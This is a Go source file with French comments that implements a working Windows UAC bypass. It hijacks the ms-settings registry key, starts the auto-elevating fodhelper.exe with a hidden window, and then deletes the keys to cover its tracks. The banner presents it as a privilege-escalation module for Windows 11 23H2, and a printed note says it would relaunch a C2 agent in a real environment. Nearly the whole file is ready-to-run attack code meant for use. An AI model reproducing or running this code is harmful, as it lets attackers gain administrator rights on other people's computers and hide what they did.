//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
)

// CheckAdmin : Vérifie si le processus actuel possède les privilèges Administrateur
func CheckAdmin() bool {
	// La commande 'net session' renvoie une erreur si on n'est pas admin
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// ExploitUAC : Réalise un bypass de l'UAC via l'outil légitime fodhelper.exe
// Cette technique exploite une vulnérabilité de confiance dans le registre Windows.
func ExploitUAC() bool {
	fmt.Println("[*] Phase 1 : Préparation de l'environnement (Registry Hijacking)...")

	// Chemins dans le registre
	regKey := `Software\Classes\ms-settings\Shell\Open\command`

	// 1. Création de la structure de registre nécessaire
	// On dit à Windows : "Quand fodhelper veut ouvrir les paramètres, lance mon code à la place"
	// On va lancer un CMD qui lui-même lance notre binaire avec les droits hérités

	selfPath, _ := os.Executable()
	// Le payload va maintenant relancer ce même binaire avec les droits élevés
	payload := fmt.Sprintf("cmd.exe /c start \"\" \"%s\"", selfPath)

	// Nettoyage préalable (au cas où)
	exec.Command("reg", "delete", "HKCU\\"+regKey, "/f").Run()

	// Ajout des clés malicieuses
	err1 := exec.Command("reg", "add", "HKCU\\"+regKey, "/ve", "/t", "REG_SZ", "/d", payload, "/f").Run()
	err2 := exec.Command("reg", "add", "HKCU\\"+regKey, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f").Run()

	if err1 != nil || err2 != nil {
		fmt.Println("[-] Erreur lors de la modification du registre.")
		return false
	}

	fmt.Println("[*] Phase 2 : Déclenchement via fodhelper.exe...")

	// 2. Lancement du binaire système auto-élevé
	// Fodhelper va s'exécuter, voir notre clé de registre et exécuter notre payload en tant qu'ADMIN
	cmd := exec.Command("fodhelper.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()

	if err != nil {
		fmt.Printf("[-] Impossible de lancer fodhelper : %v\n", err)
		return false
	}

	fmt.Println("[*] Phase 3 : Nettoyage des traces...")
	time.Sleep(2 * time.Second) // On attend que fodhelper lise la clé

	// On supprime les clés de registre pour rester discret
	exec.Command("reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f").Run()

	return true
}

func main() {
	fmt.Println("====================================================")
	fmt.Println("   Windows 11 Privilege Escalation Module v6.0")
	fmt.Println("   Target: Windows 11 23H2 (Build 22631)")
	fmt.Println("   Method: UAC Bypass (FodHelper Hijack)")
	fmt.Println("====================================================")

	if CheckAdmin() {
		fmt.Println("[+] État : DÉJÀ ADMINISTRATEUR")
		fmt.Println("[*] Session SYSTEM identifiée. Aucune action requise.")
		return
	}

	fmt.Println("[!] État : UTILISATEUR LIMITÉ")
	fmt.Println("[*] Tentative d'escalade de privilèges en cours...")

	if ExploitUAC() {
		fmt.Println("\n[+] ANALYSE TERMINÉE : L'exploit a été déclenché.")
		fmt.Println("[?] Vérifiez si une nouvelle fenêtre CMD (Admin) s'est ouverte.")
		fmt.Println("[*] Note: En environnement réel, ce module relancerait l'agent C2.")
	} else {
		fmt.Println("[-] ÉCHEC : Impossible d'exécuter l'escalade.")
	}

	fmt.Println("\nAppuyez sur Entrée pour quitter...")
	var input string
	fmt.Scanln(&input)
}
